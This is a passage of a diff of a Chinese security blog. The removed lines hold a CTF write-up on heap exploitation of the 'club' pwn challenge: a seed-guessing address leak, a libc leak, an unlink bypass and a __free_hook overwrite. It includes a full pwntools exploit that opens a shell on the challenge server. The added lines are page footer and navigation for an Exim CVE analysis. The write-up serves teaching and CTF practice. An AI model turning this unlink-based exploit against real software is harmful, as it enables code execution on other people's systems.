guest(random_num):</div><div class="line">    seed_base = 0x202148</div><div class="line">    libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</div><div class="line">    for x in xrange(0x10000000, 0xfffff000, 0x1000):</div><div class="line">        libc.srand(x+seed_base)</div><div class="line">        if libc.rand() == random_num:</div><div class="line">            next_randnum = libc.rand()</div><div class="line">            break</div><div class="line">    return next_randnum</div><div class="line"></div><div class="line">def main():</div><div class="line">    random_num = get_rand_num()</div><div class="line">    next_randnum = guest(random_num)</div><div class="line">    elf_base = get_elf_base(next_randnum)</div><div class="line">    print &quot;get ELF base address: 0x%x&quot;%elf_base</div></pre></td></tr></table></figure>
-<p>因为python的random和c的是不一样的，所以这里使用ctypes去调用libc中的random</p>
-<h2 id="ELF中的漏洞"><a href="#ELF中的漏洞" class="headerlink" title="ELF中的漏洞"></a>ELF中的漏洞</h2><p>最关键的一个就是有一个bool标志位，默认值是0，表示该box没有malloc，当malloc后标志位会设置为1，但是当free后，却没有把标志位清零，这就导致可以无限free，一个被free的box，也可以修改和输出box的内容</p>
-<p>另一个关键的漏洞是修改box内容的函数中存在off by one</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">for ( i = 0; dword_202090[v3] &gt;= i; ++i )</div><div class="line">&#123;</div><div class="line">    read(0, &amp;buf, 1uLL);</div><div class="line">    if ( buf == 10 )</div><div class="line">        break;</div><div class="line">        *(i + qword_202100[v3]) = buf;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>如果长度有24的box，却可以输入25个字符</p>
-<p>还有一个也算漏洞的是再show message函数中，输出使用了puts，输出是根据<code>\x00</code>判断结尾，而不是长度，而在修改message的函数中也没有在用户输入的数据结尾加<code>\x00</code>，所以有可能导致信息泄露，不过这个漏洞对我来说不重要，我的利用方法中，不包含其信息泄露的利用</p>
-<h2 id="获取LIBC基地址"><a href="#获取LIBC基地址" class="headerlink" title="获取LIBC基地址"></a>获取LIBC基地址</h2><p>泄露LIBC地址的思路很简单，上面说了当一个box被free后因为标志位没有被清零，所以任然可以往里面写数据，输出数据。</p>
-<p>如果我们free一个非fast chunk的chunk，也就是说free一个chunk size大于maxfastsize的chunk，将会和unsortbin形成双链表，这个时候的结构如下：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">prev size</th>
-<th style="text-align:center">chunk size</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">fd</td>
-<td style="text-align:center">bk</td>
-</tr>
-</tbody>
-</table>
-<p>这个时候fd和bk都指向arena中的top_chunk指针，我们能通过输出该box获取到该地址，然后根据偏移值计算出libc的基地址，部分代码如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">def get_libc_base():</div><div class="line">    free_box(3)</div><div class="line">    show_message(3)</div><div class="line">    data = r.readuntil(&quot;You&quot;)[:-3].strip()</div><div class="line">    top = u64(data+&quot;\x00\x00&quot;)</div><div class="line">    return top - top_chunk</div><div class="line"></div><div class="line">def main():</div><div class="line">    ....</div><div class="line">    create_box(1, 24)</div><div class="line">    create_box(2, 168)</div><div class="line">    create_box(3, 184)</div><div class="line">    create_box(4, 200)</div><div class="line">    libc_base = get_libc_base()</div><div class="line"></div><div class="line">    print &quot;get libc base address: 0x%x&quot;%libc_base</div></pre></td></tr></table></figure>
-<p>free的那个box不能是最后一个chunk，否则会和top chunk合并</p>
-<h2 id="unlink利用"><a href="#unlink利用" class="headerlink" title="unlink利用"></a>unlink利用</h2><p>网上很多unlink的文章，我就不细说了，简单的来说就是要过一个判断，执行一个指令</p>
-<p>需要过一个判断：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd-&gt;bk == P</div><div class="line">P-&gt;bk-&gt;fd == P</div></pre></td></tr></table></figure>
-<p>执行一个指令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">FD = P-&gt;fd</div><div class="line">BK = P-&gt;bk</div><div class="line">FD-&gt;bk = BK</div><div class="line">BK-&gt;fd = FD</div></pre></td></tr></table></figure>
-<p>当利用之前的代码，泄露完libc地址后，堆布局是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">0x555555757410:	0x0000000000000000	0x0000000000000021   &lt;- box1</div><div class="line">0x555555757420:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757430:	0x0000000000000000	0x00000000000000b1   &lt;- box2</div><div class="line">0x555555757440:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757450:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757460:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757470:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757480:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757490:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574a0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574e0:	0x0000000000000000	0x00000000000000c1    &lt;- box3</div><div class="line">0x5555557574f0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78</div><div class="line">0x555555757500:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757510:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757520:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757530:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757540:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757550:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757560:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757570:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757580:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757590:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575a0:	0x00000000000000c0	0x00000000000000d0    &lt;- box4</div><div class="line">0x5555557575b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575c0:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
-<p>然后在.bss段有个地方储存着box的地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/6gx 0x202100+0x555555554000</div><div class="line">0x555555756100:	0x0000000000000000	0x0000555555757420</div><div class="line">0x555555756110:	0x0000555555757440	0x5555557574f0</div><div class="line">0x555555756120:	0x00005555557575b0	0x0000000000000000</div></pre></td></tr></table></figure>
-<p>因为在free box函数的代码中，有一个判断：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if ( !dword_202130[v1] || dword_2020B0[v1] )</div><div class="line">    return puts(&quot;You can not destroy the box!&quot;);</div></pre></td></tr></table></figure>
-<p>而dword_2020B0是已经初始化过，然后没有代码修改过的变量</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.data:00000000002020B0 dword_2020B0      dd 2 dup(1), 2 dup(0), 2 dup(1)</div></pre></td></tr></table></figure>
-<p>扩展开了就是<code>[1, 1, 0, 0, 1, 1]</code></p>
-<p>所以只有2， 3两个box能被free</p>
-<p>在之前已经free过了box3，如果再次free box3，无法触发unlink操作，unlink操作只有在前一个或者后一个chunk未被使用时才会触发，所以我们需要通过free box2来进行触发unlink操作</p>
-<p>通过leave message函数来构造一个堆结构：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/64gx 0x555555757410</div><div class="line">0x555555757410:	0x0000000000000000	0x0000000000000021</div><div class="line">0x555555757420:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757430:	0x0000000000000000	0x00000000000000c1    修改长度为0xc1</div><div class="line">0x555555757440:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757450:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757460:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757470:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757480:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757490:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574a0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557574e0:	0x0000000000000000	0x00000000000000c1</div><div class="line">0x5555557574f0:	0x00007ffff7dd1b78	0x00000000000000b1     构造成一个新的堆，长度为0xb1</div><div class="line">0x555555757500:	0x0000555555756100	0x0000555555756108     构造fd和bk</div><div class="line">0x555555757510:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757520:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757530:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757540:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757550:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757560:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757570:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757580:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757590:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575a0:	0x00000000000000b0	0x00000000000000d0      修改prev_size为0xb0</div><div class="line">0x5555557575b0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575c0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575d0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575e0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x5555557575f0:	0x0000000000000000	0x0000000000000000</div><div class="line">0x555555757600:	0x0000000000000000	0x0000000000000000</div></pre></td></tr></table></figure>
-<p>构造了一个fd和bk指向存储box 地址的.bss段，这样就能构成一个双链表，bypass unlink的check:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P-&gt;fd-&gt;bk == P</div><div class="line">P-&gt;bk-&gt;fd == P</div></pre></td></tr></table></figure>
-<p>不过这个时候如果free box2，会报错退出，报错的内容是 <code>free(): corrupted unsorted chunks</code></p>
-<p>去源码中搜一下该error的check:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">4248  bck = unsorted_chunks(av);</div><div class="line">4249  fwd = bck-&gt;fd;</div><div class="line">4250  if (__glibc_unlikely (fwd-&gt;bk != bck))</div><div class="line">4251      malloc_printerr (&quot;free(): corrupted unsorted chunks&quot;)</div></pre></td></tr></table></figure>
-<p>bck指向unsortbin，所以fwd指向box3，然而box3的bk已经被构造成了新chunk的size位，所以报错退出了</p>
-<p>这个时候只需要在free box2之前，malloc一个box5，这样将会把unsortbin中的box3分类到smallbin中，从而bypass unsortbin check</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在free box2之后，内存大致如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/6gx 0x202100+0x555555554000</div><div class="line">0x555555756100:	0x0000000000000000 0x0000555555757420</div><div class="line">0x555555756110:	0x0000555555757440 0x0000555555756100</div><div class="line">0x555555756120:	0x00005555557575b0 0x0000555555757680</div></pre></td></tr></table></figure>
-<p>box3的地址已经指向该bss段，从而我们已经可以做到任意地址写了</p>
-<p>我的利用思路是，把box 2修改为free_hook的地址，然后把box 0修改为<code>/bin/sh\0</code>正好8byte，这样box 3就是一个<code>/bin/sh</code>字符串了</p>
-<p>我们只需要在free_hook中写上system的地址，调用free(box 3)，则相当于调用system(“/bin/sh\0”)，从而达到getshell</p>
-<p>完整payload如下:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">    context.log_level = <span class="string">"debug"</span></div><div class="line">    r = process(<span class="string">"./club"</span>)</div><div class="line">    e = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    r = remote(<span class="string">"123.206.22.95"</span>, <span class="number">8888</span>)</div><div class="line">    e = ELF(<span class="string">"./libc.so.6"</span>)</div><div class="line"></div><div class="line">malloc_hook = e.symbols[<span class="string">'__malloc_hook'</span>]</div><div class="line">free_hook = e.symbols[<span class="string">'__free_hook'</span>]</div><div class="line">system_address = e.symbols[<span class="string">'system'</span>]</div><div class="line">top_chunk = malloc_hook + <span class="number">0x68</span></div><div class="line">seed_address = <span class="number">0x202148</span></div><div class="line">addr_list = <span class="number">0x202100</span></div><div class="line">one_gadget = <span class="number">0xf0274</span></div><div class="line">puts_got = <span class="number">0x202028</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_box</span><span class="params">(n, l)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"1"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(l))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_box</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"2"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(n, msg)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"3"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line">    r.sendline(msg)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_message</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"4"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_num</span><span class="params">(n)</span>:</span></div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(<span class="string">"5"</span>)</div><div class="line">    r.readuntil(<span class="string">"&gt;"</span>)</div><div class="line">    r.sendline(str(n))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_num</span><span class="params">()</span>:</span></div><div class="line">    guess_num(<span class="number">123</span>)</div><div class="line">    r.readuntil(<span class="string">"is "</span>)</div><div class="line">    random_num = int(r.readuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">return</span> random_num</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest</span><span class="params">(random_num)</span>:</span></div><div class="line">    seed_base = <span class="number">0x202148</span></div><div class="line">    libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0x10000000</span>, <span class="number">0xfffff000</span>, <span class="number">0x1000</span>):</div><div class="line">        libc.srand(x+seed_base)</div><div class="line">        <span class="keyword">if</span> libc.rand() == random_num:</div><div class="line">            next_randnum = libc.rand()</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> next_randnum</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_elf_base</span><span class="params">(random_num)</span>:</span></div><div class="line">    guess_num(random_num)</div><div class="line">    r.readuntil(<span class="string">"secret:"</span>)</div><div class="line">    elf_base = int(r.readuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>])</div><div class="line">    <span class="keyword">return</span> elf_base-seed_address</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_libc_base</span><span class="params">()</span>:</span></div><div class="line">    free_box(<span class="number">3</span>)</div><div class="line">    show_message(<span class="number">3</span>)</div><div class="line">    data = r.readuntil(<span class="string">"You"</span>)[:<span class="number">-3</span>].strip()</div><div class="line">    top = u64(data+<span class="string">"\x00\x00"</span>)</div><div class="line">    <span class="keyword">return</span> top - top_chunk</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    random_num = get_rand_num()</div><div class="line">    next_randnum = guest(random_num)</div><div class="line">    elf_base = get_elf_base(next_randnum)</div><div class="line">    <span class="keyword">print</span> <span class="string">"get ELF base address: 0x%x"</span>%elf_base</div><div class="line">    create_box(<span class="number">1</span>, <span class="number">24</span>)</div><div class="line">    create_box(<span class="number">2</span>, <span class="number">168</span>)</div><div class="line">    create_box(<span class="number">3</span>, <span class="number">184</span>)</div><div class="line">    create_box(<span class="number">4</span>, <span class="number">200</span>)</div><div class="line">    libc_base = get_libc_base()</div><div class="line">    create_box(<span class="number">5</span>, <span class="number">300</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"get libc base address: 0x%x"</span>%libc_base</div><div class="line">    set_list2_size = p64(<span class="number">0xc1</span>)*<span class="number">3</span> + <span class="string">"\xc1"</span></div><div class="line">    leave_message(<span class="number">1</span>, set_list2_size)</div><div class="line">    set_list3 = p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>) + p64(elf_base+addr_list) + p64(elf_base+addr_list+<span class="number">8</span>)</div><div class="line">    set_list3 += <span class="string">"a"</span>*<span class="number">0x90</span>+p64(<span class="number">0xb0</span>)</div><div class="line">    leave_message(<span class="number">3</span>, set_list3)</div><div class="line">    free_box(<span class="number">2</span>)</div><div class="line">    write_address_list = <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span>*<span class="number">8</span> + p64(libc_base+free_hook)</div><div class="line">    leave_message(<span class="number">3</span>, write_address_list)</div><div class="line">    leave_message(<span class="number">2</span>, p64(libc_base+system_address))</div><div class="line">    free_box(<span class="number">3</span>)</div><div class="line">    <span class="comment"># leave_message(3, "aaaaaaaa")</span></div><div class="line">    <span class="comment"># show_message(3)</span></div><div class="line">    r.interactive()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>unlink原理很早我就知道了，但是却是第一次实践，理论和实际还是差很大的，所以我踩了挺多的坑，花了挺多的时间</p>
-<p>我还考虑过fastbin的double free的利用，但是失败了……</p>
-]]></content:encoded>
-      
-      <comments>http://0x48.pw/2017/11/03/0x3C/#disqus_thread</comments>
-    </item>
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/12/01/0x3E/">CVE-2017-16943 Exim UAF漏洞分析</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2017-12-01, 11:22:37</p>
+        <p><span>最后更新:</span>2017-12-01, 17:10:09</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/12/01/0x3E/" title="CVE-2017-16943 Exim UAF漏洞分析">http://0x48.pw/2017/12/01/0x3E/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2017/12/01/0x3E/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/11/11/0x3D/">
+                    CTF PWN题之setbuf的利用
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞复现"><span class="toc-number">1.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PoC测试"><span class="toc-number">1.2.</span> <span class="toc-text">PoC测试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#浅入研究"><span class="toc-number">2.</span> <span class="toc-text">浅入研究</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#深入研究"><span class="toc-number">3.</span> <span class="toc-text">深入研究</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb"><span class="toc-number">3.1.</span> <span class="toc-text">(gdb)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#307-ss-store-get-length-nonprintcount-3-1"><span class="toc-number">3.2.</span> <span class="toc-text"> 307 ss = store_get(length + nonprintcount * 3 + 1);</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一步"><span class="toc-number">3.2.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二步"><span class="toc-number">3.2.2.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第三步"><span class="toc-number">3.2.3.</span> <span class="toc-text">第三步</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#引用"><span class="toc-number">5.</span> <span class="toc-text">引用</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
     
-  </channel>
-</rss>
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/11/11/0x3D/" title="下一篇: CTF PWN题之setbuf的利用">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/12/01/0x3E/">CVE-2017-16943 Exim UAF漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/11/0x3D/">CTF PWN题之setbuf的利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/03/0x3C/">看雪CTF 第四题club_pwn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/30/0x3B/">TP-Link WR941N路由器研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/04/0x3A/">Pwnhub 2013的国庆 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/0x39/">HITB CTF 2017 Pwn题研究🙉</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/0x38/">Pwnhub之奇妙的巨蟒 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/07/0x37/">malloc.c源码阅读之__libc_free</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/01/0x36/">堆溢出学习之0CTF 2017 Babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/25/0x35/">glibc malloc学习笔记之fastbin🐦</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/12/0x34/">对虚拟机进行磁盘扩容🐥</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li 